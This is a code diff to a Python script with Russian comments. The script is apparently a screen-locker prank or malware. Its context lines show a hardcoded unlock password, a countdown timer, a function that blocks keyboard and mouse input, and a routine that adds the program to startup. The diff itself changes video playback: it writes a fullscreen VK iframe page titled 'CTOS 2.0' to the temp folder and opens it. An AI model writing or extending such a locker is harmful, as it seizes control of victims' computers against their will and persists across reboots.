@@ -1,9 +1,10 @@
-import ctypes, os, sys, time, threading, random, webbrowser, tkinter as tk
+import ctypes, os, sys, time, threading, random, webbrowser, tempfile, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
-VIDEO_URL = "https://vk.com/video-30602036_456293338"  # <-- ЗАМЕНИ НА СВОЮ ССЫЛКУ НА MP4
+# ID твоего видео из ВК
+VIDEO_ID = "30602036_456293338"
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -37,10 +38,29 @@ def add_to_startup():
     except:
         pass
 
-# === ЗАПУСКАЕМ ВИДЕО В БРАУЗЕРЕ ===
+# === СОЗДАЁМ И ЗАПУСКАЕМ HTML С ВИДЕО ===
 def play_video():
     try:
-        webbrowser.open(VIDEO_URL)
+        # HTML-код для плеера ВК на полный экран
+        html_content = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>CTOS 2.0</title>
+    <style>
+        * {{ margin: 0; padding: 0; overflow: hidden; }}
+        body {{ background: #000; }}
+        iframe {{ position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; }}
+    </style>
+</head>
+<body>
+    <iframe src="https://vk.com/video_ext.php?oid={VIDEO_ID.split('_')[0]}&id={VIDEO_ID.split('_')[1]}&autoplay=1&js_api=1" allowfullscreen allow="autoplay; fullscreen"></iframe>
+</body>
+</html>"""
+        # Сохраняем HTML во временную папку
+        html_file = os.path.join(tempfile.gettempdir(), "vk_video.html")
+        with open(html_file, "w", encoding="utf-8") as f:
+            f.write(html_content)
+        webbrowser.open(html_file)
     except:
         pass
 
